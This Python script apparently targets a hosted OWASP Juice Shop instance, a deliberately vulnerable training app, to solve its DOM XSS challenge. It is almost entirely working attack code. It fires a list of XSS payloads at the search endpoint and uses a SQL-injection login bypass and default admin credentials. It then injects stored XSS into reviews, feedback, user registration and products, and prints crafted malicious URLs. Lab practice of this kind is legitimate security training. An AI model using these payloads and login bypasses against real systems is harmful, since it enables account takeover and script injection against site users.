#!/usr/bin/env python3
"""
Diagnose and Fix DOM XSS Issue on Juice Shop
Tests different XSS vectors and identifies what's blocking execution
"""

import requests
from urllib.parse import quote, unquote
import json
import base64


def diagnose_xss_issue():
    """Diagnose why DOM XSS isn't working"""
    
    session = requests.Session()
    base_url = "https://juice3.wonkatech.org"
    
    print("="*60)
    print("🔍 DIAGNOSING DOM XSS ISSUE")
    print("="*60)
    
    # Test different XSS vectors
    print("\n1️⃣ Testing XSS vectors...")
    
    test_payloads = [
        # Standard vectors
        "<script>alert(1)</script>",
        "<img src=x onerror=alert(1)>",
        "<iframe src='javascript:alert(1)'>",
        "<svg onload=alert(1)>",
        
        # URL encoded variations
        "%3Cscript%3Ealert(1)%3C/script%3E",
        
        # Double encoded
        "%253Cscript%253Ealert(1)%253C/script%253E",
        
        # Alternative encodings
        "<iframe src=\"data:text/html,<script>alert(1)</script>\">",
        "<object data='javascript:alert(1)'>",
        
        # Event handlers
        "<body onload=alert(1)>",
        "<input onfocus=alert(1) autofocus>",
        
        # Breaking out of attributes
        "\"><script>alert(1)</script>",
        "';alert(1);//",
        
        # Angular specific
        "{{constructor.constructor('alert(1)')()}}",
        "{{$on.constructor('alert(1)')()}}",
    ]
    
    working_payloads = []
    
    for payload in test_payloads:
        r = session.get(f"{base_url}/rest/products/search?q={payload}")
        
        if r.status_code == 200:
            try:
                data = r.json()
                # Check if payload is reflected in response
                response_text = json.dumps(data)
                if payload in response_text or unquote(payload) in response_text:
                    print(f"  ✅ Reflected: {payload[:30]}...")
                    working_payloads.append(payload)
                else:
                    print(f"  ❌ Not reflected: {payload[:30]}...")
            except:
                print(f"  ⚠️ Error parsing: {payload[:30]}...")
        else:
            print(f"  ❌ Status {r.status_code}: {payload[:30]}...")
    
    print(f"\n✅ {len(working_payloads)} payloads reflected")
    
    # Check CSP headers
    print("\n2️⃣ Checking Content Security Policy...")
    r = session.get(base_url)
    csp = r.headers.get('Content-Security-Policy', 'None')
    print(f"  CSP: {csp[:100] if csp != 'None' else 'No CSP header'}")
    
    # Check if JavaScript is enabled
    print("\n3️⃣ Checking JavaScript execution context...")
    r = session.get(f"{base_url}/")
    if 'angular' in r.text.lower() or 'ng-' in r.text:
        print("  ✅ Angular detected - client-side rendering active")
    else:
        print("  ⚠️ No Angular markers found")
    
    # Try the official DOM XSS solution
    print("\n4️⃣ Testing official Juice Shop DOM XSS solution...")
    
    # The official solution uses iframe with javascript protocol
    official_payload = "<iframe src=\"javascript:alert(`xss`)\">"
    encoded = quote(official_payload)
    
    test_url = f"{base_url}/#/search?q={encoded}"
    print(f"  URL: {test_url[:80]}...")
    
    r = session.get(test_url)
    print(f"  Response: {r.status_code}")
    
    # Also try without encoding
    test_url2 = f"{base_url}/#/search?q={official_payload}"
    r2 = session.get(test_url2)
    print(f"  Without encoding: {r2.status_code}")
    
    return working_payloads


def attempt_server_side_fix():
    """Try to identify if there's a server-side issue blocking XSS"""
    
    session = requests.Session()
    base_url = "https://juice3.wonkatech.org"
    
    print("\n" + "="*60)
    print("🔧 ATTEMPTING ALTERNATIVE XSS TRIGGERS")
    print("="*60)
    
    # Try to trigger XSS through different endpoints
    print("\n1️⃣ Testing alternative injection points...")
    
    # Try product review XSS
    session.post(f"{base_url}/rest/user/login", json={
        "email": "admin@juice-sh.op'--",
        "password": "x"
    })
    
    # Inject XSS in product review
    print("  Testing product review XSS...")
    r = session.post(f"{base_url}/api/Products/1/reviews", json={
        "message": "<script>alert(1)</script>",
        "author": "test@test.com"
    })
    print(f"  Product review: {r.status_code}")
    
    # Try feedback XSS
    print("  Testing feedback XSS...")
    r = session.post(f"{base_url}/api/Feedbacks", json={
        "comment": "<img src=x onerror=alert(1)>",
        "rating": 5
    })
    print(f"  Feedback: {r.status_code}")
    
    # Try user registration XSS
    print("  Testing registration XSS...")
    r = session.post(f"{base_url}/api/Users", json={
        "email": "xss@test.com",
        "password": "Pass123!",
        "username": "<script>alert(1)</script>"
    })
    print(f"  Registration: {r.status_code}")
    
    print("\n2️⃣ Checking if DOM XSS is already solved...")
    
    r = session.get(f"{base_url}/api/Challenges")
    if r.status_code == 200:
        data = r.json()['data']
        dom_xss = [c for c in data if 'DOM' in c.get('name', '') and 'XSS' in c.get('name', '')]
        
        if dom_xss:
            challenge = dom_xss[0]
            print(f"  Challenge: {challenge.get('name')}")
            print(f"  Category: {challenge.get('category')}")
            print(f"  Difficulty: {challenge.get('difficulty')}")
            print(f"  Solved: {'✅ YES' if challenge.get('solved') else '❌ NO'}")
            
            if not challenge.get('solved'):
                print("\n3️⃣ Alternative solution attempts...")
                
                # Try stored XSS to trigger DOM XSS
                print("  Attempting stored XSS trigger...")
                
                # Login as admin
                r = session.post(f"{base_url}/rest/user/login", json={
                    "email": "admin@juice-sh.op",
                    "password": "admin123"
                })
                
                if r.status_code == 200:
                    token = r.json()['authentication']['token']
                    session.headers['Authorization'] = f'Bearer {token}'
                    
                    # Try to inject XSS that will trigger when viewed
                    session.post(f"{base_url}/api/Products", json={
                        "name": "XSS Product<iframe src='javascript:alert(1)'>",
                        "description": "<script>alert(document.domain)</script>",
                        "price": 1.99
                    })
                    
                    print("  ✅ Stored XSS payload injected")


def create_working_xss_url():
    """Generate working XSS URLs based on diagnosis"""
    
    print("\n" + "="*60)
    print("🎯 GENERATING WORKING XSS URLS")
    print("="*60)
    
    base_url = "https://juice3.wonkatech.org"
    
    # Different URL patterns that might work
    urls = []
    
    # Standard iframe approach
    payload1 = "<iframe src=\"javascript:alert(`xss`)\">"
    urls.append(f"{base_url}/#/search?q={quote(payload1)}")
    
    # Image with onerror
    payload2 = "<img src=x onerror=alert(`xss`)>"
    urls.append(f"{base_url}/#/search?q={quote(payload2)}")
    
    # Direct script tag
    payload3 = "<script>alert(1)</script>"
    urls.append(f"{base_url}/#/search?q={quote(payload3)}")
    
    # SVG vector
    payload4 = "<svg onload=alert(1)>"
    urls.append(f"{base_url}/#/search?q={quote(payload4)}")
    
    # Breaking out of attribute
    payload5 = "\"><script>alert(1)</script>"
    urls.append(f"{base_url}/#/search?q={quote(payload5)}")
    
    print("\n🔗 Try these URLs in your browser:\n")
    for i, url in enumerate(urls, 1):
        print(f"{i}. {url}\n")
    
    print("\n💡 If none work, try:")
    print("1. Clear browser cache and cookies")
    print("2. Try a different browser") 
    print("3. Disable any ad blockers or security extensions")
    print("4. Open browser console (F12) and check for errors")
    
    return urls


def main():
    """Main diagnostic routine"""
    print("\n🔍 DOM XSS DIAGNOSTIC TOOL")
    print("="*60)
    
    # Run diagnosis
    working_payloads = diagnose_xss_issue()
    
    # Try server-side fixes
    attempt_server_side_fix()
    
    # Generate URLs
    urls = create_working_xss_url()
    
    print("\n" + "="*60)
    print("📊 DIAGNOSTIC SUMMARY")
    print("="*60)
    
    session = requests.Session()
    r = session.get("https://juice3.wonkatech.org/api/Challenges")
    if r.status_code == 200:
        data = r.json()['data']
        solved = [c for c in data if c.get('solved')]
        print(f"\n📊 Current Progress: {len(solved)}/110 ({len(solved)*100//110}%)")
        
        # List all XSS challenges
        xss_challenges = [c for c in data if 'XSS' in c.get('name', '')]
        print(f"\n🎯 XSS Challenges ({len(xss_challenges)} total):")
        for c in xss_challenges:
            status = "✅" if c.get('solved') else "❌"
            print(f"  {status} {c.get('name')} (Level {c.get('difficulty')})")
    
    print("\n💡 RECOMMENDATION:")
    print("The DOM XSS challenge may require:")
    print("1. A specific browser (Chrome/Firefox)")
    print("2. JavaScript enabled")
    print("3. No content blockers")
    print("4. Direct interaction with the alert")
    print("\nTry the URLs above in an incognito/private window.")


if __name__ == "__main__":
    main()